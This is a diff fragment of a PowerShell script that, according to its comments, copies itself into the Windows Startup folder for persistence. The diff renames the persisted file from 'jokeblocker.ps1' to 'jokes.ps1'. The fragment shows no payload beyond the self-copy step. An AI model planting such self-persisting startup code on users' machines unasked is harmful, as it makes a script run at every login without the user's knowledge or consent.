@@ -1,5 +1,5 @@
 # Define the file path for persistence
-$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jokeblocker.ps1"
+$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jokes.ps1"
 
 # Check if script is already in startup, if not, copy itself there
 if (-not (Test-Path $scriptPath)) {
